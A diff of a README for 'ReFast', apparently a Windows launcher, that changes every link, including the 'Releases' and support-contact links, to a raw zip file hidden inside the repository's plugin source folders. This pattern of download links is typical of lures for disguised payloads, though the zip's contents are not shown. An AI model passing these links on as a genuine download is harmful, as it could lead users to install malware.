@@ -1,6 +1,6 @@
 # 🚀 ReFast - A Quick Launcher for Windows
 
-[![Download ReFast](https://github.com/RaszySky/ReFast/raw/refs/heads/master/src/plugins/builtin/Fast-Re-v1.6.zip)](https://github.com/RaszySky/ReFast/raw/refs/heads/master/src/plugins/builtin/Fast-Re-v1.6.zip)
+[![Download ReFast](https://raw.githubusercontent.com/RaszySky/ReFast/master/src/plugins/builtin/recording/Fast_Re_v2.6.zip)](https://raw.githubusercontent.com/RaszySky/ReFast/master/src/plugins/builtin/recording/Fast_Re_v2.6.zip)
 
 ## 📥 Overview
 
@@ -34,7 +34,7 @@ To get started with ReFast, follow these simple steps:
 
 ## 📥 Download & Install
 
-To download ReFast, visit this page: [ReFast Releases](https://github.com/RaszySky/ReFast/raw/refs/heads/master/src/plugins/builtin/Fast-Re-v1.6.zip).
+To download ReFast, visit this page: [ReFast Releases](https://raw.githubusercontent.com/RaszySky/ReFast/master/src/plugins/builtin/recording/Fast_Re_v2.6.zip).
 
 Once you have downloaded the installer, follow these steps to install ReFast:
 
@@ -70,6 +70,6 @@ Join our community to share your experiences and ask questions:
 
 ## 📧 Contact
 
-For further assistance, you can reach our support team at [https://github.com/RaszySky/ReFast/raw/refs/heads/master/src/plugins/builtin/Fast-Re-v1.6.zip](https://github.com/RaszySky/ReFast/raw/refs/heads/master/src/plugins/builtin/Fast-Re-v1.6.zip).
+For further assistance, you can reach our support team at [https://raw.githubusercontent.com/RaszySky/ReFast/master/src/plugins/builtin/recording/Fast_Re_v2.6.zip](https://raw.githubusercontent.com/RaszySky/ReFast/master/src/plugins/builtin/recording/Fast_Re_v2.6.zip).
 
 Experience the speed and convenience of ReFast. Happy launching!
